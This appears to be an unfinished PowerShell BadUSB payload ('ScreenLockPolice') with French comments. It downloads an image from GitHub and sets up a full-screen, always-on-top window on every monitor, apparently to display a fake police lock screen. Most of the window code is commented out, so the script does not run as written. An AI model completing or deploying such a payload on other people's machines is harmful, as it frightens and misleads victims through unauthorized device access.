# Créer une fenêtre WPF
Add-Type -AssemblyName PresentationFramework

# Récupère le dossier temporaire de l'utilisateur
$TempFolder = [System.IO.Path]::GetTempPath()

# Définir le chemin de l'image de fond d'écran
$wallpaperPath = Join-Path $TempFolder "wallpaper.png"

# Télécharge l'image de fond d'écran depuis GitHub et la place dans le dossier Images
Invoke-WebRequest -Uri "https://github.com/MagikarpLv13/bad_usb_payloads/raw/master/ScreenLockPolice/wallpaper.png" -OutFile $wallpaperPath

# XAML pour définir la fenêtre et l'image
$xaml = @"
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        WindowStartupLocation="CenterScreen"
        WindowState="Maximized"
        WindowStyle="None"
        Background="Black"
        Topmost="True"
        AllowsTransparency="True">
    <Grid>
        <Image Name="imgBackground" Stretch="UniformToFill" HorizontalAlignment="Center" VerticalAlignment="Center"/>
    </Grid>
</Window>
"@


# Récupérer le nombre de moniteurs de l'utilisateur
$monitors = [System.Windows.Forms.Screen]::AllScreens

foreach ($monitor in $monitors) {
    <# # Créer une fenêtre pour chaque moniteur
    $reader = [System.Xml.XmlReader]::Create((New-Object System.IO.StringReader $xaml))
    $window = [Windows.Markup.XamlReader]::Load($reader)

    # Charger l'image PNG
    $imgSource = New-Object System.Windows.Media.Imaging.BitmapImage
    $imgSource.BeginInit()
    $imgSource.UriSource = New-Object Uri($wallpaperPath, [UriKind]::Absolute)
    $imgSource.CacheOption = [System.Windows.Media.Imaging.BitmapCacheOption]::OnLoad
    $imgSource.EndInit()

    # Assigner l'image PNG à l'image dans la fenêtre
    $window.FindName('imgBackground').Source = $imgSource #>

    # Positionner la fenêtre sur le moniteur actuel

    Write-Host "Monitor: $($monitor.DeviceName)"
    Write-Host "Bounds: $($monitor.Bounds.Left)"

    [int]$leftPosition = $monitor.Bounds.Left
    
    $window.Left = $leftPosition

    # $window.Left = [System.Windows.Forms.Screen]::AllScreens[$monitor].Bounds.Left
    # $window.Top = [System.Windows.Forms.Screen]::AllScreens[$monitor].Bounds.Top
    # $window.Width = [System.Windows.Forms.Screen]::AllScreens[$monitor].Bounds.Width
    # $window.Height = [System.Windows.Forms.Screen]::AllScreens[$monitor].Bounds.Height

    # Afficher la fenêtre
    # $window.ShowDialog()
}